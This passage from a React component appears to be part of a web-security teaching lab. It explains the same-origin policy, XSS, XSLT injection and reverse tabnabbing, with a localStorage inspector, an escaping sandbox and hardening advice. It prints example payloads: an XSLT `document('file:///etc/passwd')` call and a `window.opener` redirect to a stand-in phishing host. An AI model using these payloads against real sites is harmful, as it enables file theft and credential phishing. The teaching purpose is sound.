                  No query parameters detected in the target URL.
                </div>
              ) : (
                <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3 font-mono text-xs">
                  {auditResult.queryParams.map((qp, idx) => (
                    <div 
                      key={idx}
                      className={`p-3 rounded-xl border ${qp.isSensitive ? 'bg-amber-400/10 border-amber-400/40' : 'bg-black/40 border-white/10'} space-y-1`}
                    >
                      <div className="flex items-center justify-between text-[11px]">
                        <span className="text-secondary font-bold">{qp.key}</span>
                        {qp.isSensitive && (
                          <span className="text-[10px] text-amber-400 font-bold uppercase">Sensitive Key!</span>
                        )}
                      </div>
                      <div className="text-white break-all bg-white/5 p-1.5 rounded">
                        {qp.value || '(empty)'}
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>
        )}

        {/* TAB 3: BROWSER SOP & TAB ISOLATION LAB */}
        {activeTab === 'sop-lab' && (
          <div className="space-y-8">
            
            {/* The Concept Explainer */}
            <div className="p-6 rounded-2xl bg-cardBg border border-white/10 space-y-4">
              <div className="flex items-center gap-2 text-secondary font-bold text-sm">
                <Layers className="w-4 h-4" />
                <span>The Core Law of Browser Security: Same-Origin Policy (SOP)</span>
              </div>
              <p className="text-sm text-muted leading-relaxed">
                A common misconception is that a webpage can inspect or steal <strong className="text-white">LocalStorage from other tabs</strong>. 
                In reality, browsers enforce a strict cryptographic and origin sandbox:
              </p>
              
              {/* Origin Equation */}
              <div className="p-4 rounded-xl bg-black/60 border border-primary/30 font-mono text-xs flex flex-wrap items-center justify-center gap-3 text-center">
                <span className="px-3 py-1.5 rounded bg-primary/20 text-secondary border border-primary/40">
                  Protocol (https://)
                </span>
                <span className="text-muted">+</span>
                <span className="px-3 py-1.5 rounded bg-primary/20 text-secondary border border-primary/40">
                  Domain (jasir.dev)
                </span>
                <span className="text-muted">+</span>
                <span className="px-3 py-1.5 rounded bg-primary/20 text-secondary border border-primary/40">
                  Port (:443)
                </span>
                <span className="text-muted">=</span>
                <span className="px-3 py-1.5 rounded bg-highlight/20 text-highlight border border-highlight/40 font-bold">
                  UNIQUE ORIGIN
                </span>
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-xs font-mono pt-2">
                <div className="p-4 rounded-xl bg-highlight/5 border border-highlight/30 space-y-2">
                  <span className="font-bold text-highlight flex items-center gap-1.5">
                    <CheckCircle2 className="w-4 h-4" />
                    What SOP Prevents (Protected):
                  </span>
                  <ul className="list-disc list-inside space-y-1 text-muted">
                    <li>Tab A cannot read Tab B’s <code className="text-white">localStorage</code>.</li>
                    <li>Tab A cannot read Tab B’s <code className="text-white">document.cookie</code>.</li>
                    <li>Tab A cannot inspect or manipulate Tab B’s DOM tree.</li>
                    <li>Fetch responses from other domains are blocked without CORS headers.</li>
                  </ul>
                </div>

                <div className="p-4 rounded-xl bg-accent/5 border border-accent/30 space-y-2">
                  <span className="font-bold text-accent flex items-center gap-1.5">
                    <AlertTriangle className="w-4 h-4" />
                    How XSS Breaks This (The Attack):
                  </span>
                  <ul className="list-disc list-inside space-y-1 text-muted">
                    <li>XSS injects script <strong className="text-white">INSIDE Tab A itself</strong>.</li>
                    <li>Since the code runs <em>inside</em> Tab A's origin, SOP does NOT block it!</li>
                    <li>The injected script can now read Tab A’s <code className="text-white">localStorage.getItem('token')</code>!</li>
                    <li>Defense: Store tokens in <code className="text-secondary">HttpOnly Cookies</code> (JS cannot touch them).</li>
                  </ul>
                </div>
              </div>
            </div>

            {/* Experiment 1: Live LocalStorage of Active Origin */}
            <div className="p-6 rounded-2xl bg-cardBg border border-white/10 space-y-5">
              <div className="flex flex-wrap items-center justify-between gap-3">
                <div className="space-y-1">
                  <h3 className="text-sm font-bold text-white flex items-center gap-2">
                    <Database className="w-4 h-4 text-highlight" />
                    Live LocalStorage Inspector: Current Origin ({window.location.origin})
                  </h3>
                  <p className="text-xs text-muted">
                    These are the actual keys currently held in this browser origin's isolated LocalStorage store.
                  </p>
                </div>
                <button
                  onClick={refreshLocalStorage}
                  className="px-3 py-1.5 rounded-lg bg-white/5 hover:bg-white/10 text-muted hover:text-white border border-white/10 text-xs font-mono flex items-center gap-1.5 cursor-pointer"
                >
                  <RotateCcw className="w-3.5 h-3.5" />
                  Refresh
                </button>
              </div>

              {/* Items List */}
              <div className="space-y-2 font-mono text-xs">
                {localOriginStorage.length === 0 ? (
                  <div className="p-4 rounded-xl bg-black/40 border border-white/5 text-muted text-center">
                    No items in current origin LocalStorage. Use the creator below to test!
                  </div>
                ) : (
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                    {localOriginStorage.map((item, idx) => (
                      <div 
                        key={idx}
                        className="p-3 rounded-xl bg-black/40 border border-white/10 flex items-start justify-between gap-2"
                      >
                        <div className="space-y-0.5 min-w-0">
                          <span className="text-secondary font-bold block truncate">{item.key}</span>
                          <span className="text-white/80 text-[11px] block truncate">{item.value}</span>
                        </div>
                        <button
                          onClick={() => handleRemoveStorageItem(item.key)}
                          aria-label={`Delete ${item.key}`}
                          className="text-muted hover:text-accent p-1 transition-colors flex-shrink-0"
                        >
                          <Trash2 className="w-3.5 h-3.5" />
                        </button>
                      </div>
                    ))}
                  </div>
                )}
              </div>

              {/* Add Mock Key Form */}
              <div className="pt-3 border-t border-white/5 flex flex-col sm:flex-row items-center gap-3">
                <input
                  type="text"
                  placeholder="Key (e.g. demo_auth_token)"
                  value={newKey}
                  onChange={(e) => setNewKey(e.target.value)}
                  className="w-full sm:w-1/3 bg-[#030617] border border-white/20 text-white font-mono text-xs px-3 py-2 rounded-lg outline-none focus:border-secondary"
                />
                <input
                  type="text"
                  placeholder="Value (e.g. eyJhbGciOi...)"
                  value={newValue}
                  onChange={(e) => setNewValue(e.target.value)}
                  className="w-full sm:flex-1 bg-[#030617] border border-white/20 text-white font-mono text-xs px-3 py-2 rounded-lg outline-none focus:border-secondary"
                />
                <button
                  onClick={handleAddStorageItem}
                  className="w-full sm:w-auto px-4 py-2 rounded-lg bg-primary hover:bg-primary/80 text-white font-mono text-xs font-semibold flex items-center justify-center gap-1.5 cursor-pointer shadow-neon-primary"
                >
                  <Plus className="w-3.5 h-3.5" />
                  Store Item
                </button>
              </div>
            </div>

            {/* Experiment 2: Attempt Cross-Origin Access Simulation */}
            <div className="p-6 rounded-2xl bg-cardBg border border-white/10 space-y-4">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3">
                <div className="space-y-1">
                  <h3 className="text-sm font-bold text-white flex items-center gap-2">
                    <ShieldAlert className="w-4 h-4 text-accent" />
                    Experiment: Simulate Cross-Tab / Foreign LocalStorage Access
                  </h3>
                  <p className="text-xs text-muted">
                    See what happens when JavaScript attempts to inspect another origin's LocalStorage or open tab context.
                  </p>
                </div>
                <button
                  onClick={handleSimulateCrossTabAccess}
                  disabled={isSimulatingCrossTab}
                  className="px-4 py-2 rounded-xl bg-accent/20 hover:bg-accent/30 text-accent border border-accent/40 font-mono text-xs font-semibold flex items-center gap-2 cursor-pointer transition-all disabled:opacity-50"
                >
                  <Play className="w-3.5 h-3.5" />
                  <span>Execute SOP Probe</span>
                </button>
              </div>

              {/* Terminal Log Console */}
              <div className="p-4 rounded-xl bg-[#02040d] border border-white/10 font-mono text-xs space-y-1.5 min-h-[140px]">
                <div className="flex items-center gap-2 text-muted pb-2 border-b border-white/5 text-[11px]">
                  <Terminal className="w-3.5 h-3.5 text-secondary" />
                  <span>Sandbox Security Interceptor Console</span>
                </div>
                {crossTabSimulationLog.length === 0 ? (
                  <div className="text-muted/60 pt-4 text-center">
                    Click "Execute SOP Probe" above to test browser boundary enforcement against foreign origins.
                  </div>
                ) : (
                  crossTabSimulationLog.map((log, idx) => (
                    <div 
                      key={idx} 
                      className={
                        log.includes('DOMException') || log.includes('CRITICAL') 
                          ? 'text-accent font-semibold' 
                          : log.includes('ISOLATED') || log.includes('ENFORCED')
                          ? 'text-highlight font-semibold'
                          : 'text-muted'
                      }
                    >
                      {log}
                    </div>
                  ))
                )}
              </div>
            </div>

            {/* Experiment 3: Interactive XSS Sanitization Sandbox */}
            <div className="p-6 rounded-2xl bg-cardBg border border-white/10 space-y-5">
              <div className="space-y-1">
                <h3 className="text-sm font-bold text-white flex items-center gap-2">
                  <Bug className="w-4 h-4 text-secondary" />
                  Live XSS Neutralizer & HTML Escaping Sandbox
                </h3>
                <p className="text-xs text-muted">
                  Type any XSS payload below to observe how safe frameworks (like React JSX) automatically encode dangerous characters into harmless entities.
                </p>
              </div>

              <div className="space-y-2">
                <label className="text-[11px] font-mono text-muted uppercase">Untrusted User Input / Payload:</label>
                <input
                  type="text"
                  value={rawInputPayload}
                  onChange={(e) => setRawInputPayload(e.target.value)}
                  className="w-full bg-[#030617] border border-white/20 text-accent font-mono text-xs px-3.5 py-2.5 rounded-lg outline-none focus:border-secondary"
                />
              </div>

              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 font-mono text-xs">
                {/* Vulnerable Behavior */}
                <div className="p-4 rounded-xl bg-accent/10 border border-accent/40 space-y-2">
                  <span className="text-accent font-bold flex items-center gap-1.5 text-[11px] uppercase">
                    <XCircle className="w-3.5 h-3.5" />
                    If Rendered via unescaped innerHTML:
                  </span>
                  <div className="p-2.5 bg-black/60 rounded border border-accent/30 text-accent/90 break-all text-[11px]">
                    Payload executes in the client! It can read <code className="text-white">localStorage</code>, hijack clicks, or send private data to remote servers.
                  </div>
                </div>

                {/* Safe React Escaped Behavior */}
                <div className="p-4 rounded-xl bg-highlight/10 border border-highlight/40 space-y-2">
                  <span className="text-highlight font-bold flex items-center gap-1.5 text-[11px] uppercase">
                    <CheckCircle2 className="w-3.5 h-3.5" />
                    Safely Escaped in React / DOMPurify:
                  </span>
                  <div className="p-2.5 bg-black/60 rounded border border-highlight/30 text-highlight/90 break-all text-[11px]">
                    {rawInputPayload.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;')}
                  </div>
                </div>
              </div>
            </div>

          </div>
        )}

        {/* TAB 4: ATTACK VECTORS & XSL NOTES */}
        {activeTab === 'vectors' && (
          <div className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-5 font-mono text-xs">
              
              {/* XSS Types Card */}
              <div className="p-5 rounded-2xl bg-cardBg border border-white/10 space-y-3">
                <div className="flex items-center gap-2 text-primary font-bold text-sm">
                  <Flame className="w-4 h-4" />
                  <span>Cross-Site Scripting (XSS) Typologies</span>
                </div>
                <div className="space-y-2.5 text-muted leading-relaxed">
                  <div>
                    <strong className="text-white block">1. Reflected XSS:</strong>
                    Payload exists in URL query parameters or forms, reflected back immediately in the server response without sanitization.
                  </div>
                  <div>
                    <strong className="text-white block">2. Stored XSS (Persistent):</strong>
                    Payload is saved in the database (e.g. comments, profiles) and served to every visiting user.
                  </div>
                  <div>
                    <strong className="text-white block">3. DOM-based XSS:</strong>
                    Vulnerability exists purely in client-side JS writing untrusted sources (e.g. <code className="text-secondary">location.hash</code>) to sinks (e.g. <code className="text-secondary">innerHTML</code>).
                  </div>
                </div>
              </div>

              {/* XSL / XSLT Notes */}
              <div className="p-5 rounded-2xl bg-cardBg border border-white/10 space-y-3">
                <div className="flex items-center gap-2 text-secondary font-bold text-sm">
                  <FileCode className="w-4 h-4" />
                  <span>XSL & XSLT Injection Mechanics</span>
                </div>
                <div className="space-y-2.5 text-muted leading-relaxed">
                  <p>
                    <strong className="text-white">What is XSL / XSLT?</strong> Extensible Stylesheet Language Transformations 
                    are XML-based templates that convert XML documents into HTML, PDF, or other formats.
                  </p>
                  <div>
                    <strong className="text-white block">The Attack Vector:</strong>
                    If a web server or application allows untrusted user input inside an XSLT template, attackers can leverage built-in functions like:
                    <ul className="list-disc list-inside pt-1 space-y-1 text-[11px] text-accent">
                      <li><code>document('file:///etc/passwd')</code> (Arbitrary File Read / SSRF)</li>
                      <li><code>&lt;xsl:include href="..."&gt;</code> (Remote Stylesheet Inclusion)</li>
                      <li>Java / .NET extension functions (Remote Code Execution on servers)</li>
                    </ul>
                  </div>
                  <p className="text-[11px] text-secondary">
                    Modern browsers restrict client-side XSLT execution to same-origin resources to prevent cross-origin file leakage.
                  </p>
                </div>
              </div>

              {/* Tabnabbing & Opener */}
              <div className="p-5 rounded-2xl bg-cardBg border border-white/10 space-y-3">
                <div className="flex items-center gap-2 text-amber-400 font-bold text-sm">
                  <AlertTriangle className="w-4 h-4" />
                  <span>Reverse Tabnabbing (window.opener Exploit)</span>
                </div>
                <p className="text-muted leading-relaxed">
                  When a site opens an external link with <code className="text-white">target="_blank"</code> without protection, 
                  the new tab gains access to <code className="text-white">window.opener</code>. 
                  The malicious site can quietly navigate your original tab to a phishing clone:
                </p>
                <div className="p-2 bg-black/60 rounded border border-amber-400/30 text-amber-300 text-[11px]">
                  window.opener.location = "https://evil-phish.com/fake-login";
                </div>
                <p className="text-highlight text-[11px]">
                  Mitigation: Always declare <code className="text-white font-bold">rel="noopener noreferrer"</code> on all external anchor tags.
                </p>
              </div>

              {/* Defense Architecture */}
              <div className="p-5 rounded-2xl bg-cardBg border border-white/10 space-y-3">
                <div className="flex items-center gap-2 text-highlight font-bold text-sm">
                  <ShieldCheck className="w-4 h-4" />
                  <span>The 3 Pillars of Frontend Hardening</span>
                </div>
                <div className="space-y-2 text-muted leading-relaxed">
                  <div>
                    <strong className="text-white block">1. Content Security Policy (CSP):</strong>
                    Deploy HTTP header: <code className="text-secondary text-[11px]">default-src 'self'; script-src 'self'; object-src 'none';</code> to disable rogue inline scripts.
                  </div>
                  <div>
                    <strong className="text-white block">2. HttpOnly + Secure Cookies:</strong>
                    Store authentication tokens in cookies flagged <code className="text-secondary text-[11px]">HttpOnly; Secure; SameSite=Strict</code> so JavaScript cannot read them even under XSS.
                  </div>
                  <div>
                    <strong className="text-white block">3. Contextual Output Sanitization:</strong>
                    Never pass raw inputs into <code className="text-secondary text-[11px]">innerHTML</code> or <code className="text-secondary text-[11px]">eval()</code>. Use DOMPurify for rich HTML.
                  </div>
                </div>
              </div>

            </div>
          </div>
        )}

      </main>
    </div>
  );
};
